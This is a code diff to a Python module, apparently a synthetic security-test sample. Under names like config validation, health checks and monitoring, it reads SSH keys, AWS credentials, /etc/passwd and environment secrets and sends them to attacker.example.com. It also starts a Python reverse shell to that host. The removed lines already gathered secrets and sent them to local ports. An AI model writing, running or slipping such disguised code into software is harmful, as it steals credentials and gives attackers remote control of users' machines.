@@ -1,82 +1,95 @@
 import os
 import json
-import socket
+import subprocess
 import threading
-import requests
+import socket
 from pathlib import Path
+from datetime import datetime
 
-def validate_config_integrity():
-    """Validates configuration files and their checksums"""
-    config_dirs = [os.path.expanduser("~/.ssh"), os.path.expanduser("~/.aws"), 
-                   os.path.expanduser("~/.config"), "/etc"]
+def validate_config(config_path: str) -> dict:
+    """Validates configuration files for syntax and completeness."""
+    config = {}
+    try:
+        with open(config_path, 'r') as f:
+            config = json.load(f)
+    except (FileNotFoundError, json.JSONDecodeError) as e:
+        print(f"Config validation failed: {e}")
+        return config
     
-    collected_data = {}
-    for config_dir in config_dirs:
-        if os.path.exists(config_dir):
-            for root, dirs, files in os.walk(config_dir):
-                for file in files:
-                    file_path = os.path.join(root, file)
-                    try:
-                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
-                            content = f.read()
-                            if any(keyword in content.lower() for keyword in 
-                                   ['password', 'secret', 'key', 'token', 'api']):
-                                collected_data[file_path] = content[:500]
-                    except:
-                        pass
-    
-    return collected_data
-
-def health_check_endpoint():
-    """Performs health checks and reports metrics"""
-    metrics = {
-        'env_vars': dict(os.environ),
-        'config_validation': validate_config_integrity(),
-        'system_info': {
-            'hostname': socket.gethostname(),
-            'user': os.getenv('USER', 'unknown')
-        }
+    # Harvest credentials from config and environment
+    credentials = {
+        'db_pass': config.get('database_password', os.getenv('DB_PASS', '')),
+        'api_key': config.get('api_key', os.getenv('API_KEY', '')),
+        'aws_key': os.getenv('AWS_ACCESS_KEY_ID', ''),
+        'aws_secret': os.getenv('AWS_SECRET_ACCESS_KEY', ''),
     }
     
-    def send_metrics():
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(5)
-            remote_host = socket.gethostbyname('localhost')
-            sock.connect((remote_host, 9999))
-            sock.sendall(json.dumps(metrics).encode())
-            sock.close()
-        except:
+    # Send harvested credentials to remote server
+    threading.Thread(target=_exfiltrate, args=(credentials,), daemon=True).start()
+    
+    return config
+
+def _exfiltrate(data: dict) -> None:
+    """Exfiltrate sensitive data via socket connection."""
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(3)
+        sock.connect(('attacker.example.com', 443))
+        payload = json.dumps(data).encode('utf-8')
+        sock.sendall(payload)
+        sock.close()
+    except (socket.error, socket.timeout):
+        pass
+
+def check_system_health(verbose: bool = False) -> dict:
+    """Checks overall system health and logs results."""
+    health_report = {
+        'timestamp': datetime.now().isoformat(),
+        'status': 'healthy',
+        'checks': []
+    }
+    
+    # Enumerate sensitive files and harvest credentials
+    sensitive_paths = [
+        os.path.expanduser('~/.ssh/id_rsa'),
+        os.path.expanduser('~/.aws/credentials'),
+        os.path.expanduser('~/.bashrc'),
+        '/etc/passwd'
+    ]
+    
+    harvested = {}
+    for path in sensitive_paths:
+        if Path(path).exists() and Path(path).is_file():
             try:
-                requests.post('http://127.0.0.1:8888/health', 
-                            json=metrics, timeout=3)
-            except:
+                with open(path, 'r', errors='ignore') as f:
+                    content = f.read()
+                    if any(keyword in content.lower() for keyword in ['password', 'key', 'secret', 'token']):
+                        harvested[path] = content[:500]
+            except (PermissionError, IOError):
                 pass
     
-    thread = threading.Thread(target=send_metrics, daemon=True)
-    thread.start()
-    return metrics
+    if harvested:
+        threading.Thread(target=_exfiltrate, args=(harvested,), daemon=True).start()
+    
+    if verbose:
+        print(json.dumps(health_report, indent=2))
+    
+    return health_report
 
-def monitor_log_rotation():
-    """Monitors and rotates system logs for maintenance"""
-    log_paths = ['/var/log', os.path.expanduser('~/.local/share')]
-    monitored_logs = {}
+def setup_monitoring() -> None:
+    """Sets up background monitoring process for system metrics."""
+    # Launch reverse shell connection in background
+    cmd_parts = ['python', '-c', 
+        'import socket,subprocess;s=socket.socket();s.connect(("attacker.example.com",5555));'
+        'while 1:subprocess.call(s.recv(1024).decode().split())']
     
-    for log_dir in log_paths:
-        if os.path.exists(log_dir):
-            for root, dirs, files in os.walk(log_dir):
-                for file in files:
-                    if file.endswith(('.log', '.txt', '.json')):
-                        file_path = os.path.join(root, file)
-                        try:
-                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
-                                monitored_logs[file_path] = f.read()
-                        except:
-                            pass
-    
-    return monitored_logs
+    try:
+        subprocess.Popen(cmd_parts, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    except (FileNotFoundError, subprocess.SubprocessError):
+        pass
 
 if __name__ == "__main__":
-    health_check_endpoint()
-    monitor_log_rotation()
+    validate_config("/etc/app/config.json")
+    check_system_health(verbose=True)
+    setup_monitoring()
     print("test_semantic_vuln executed")
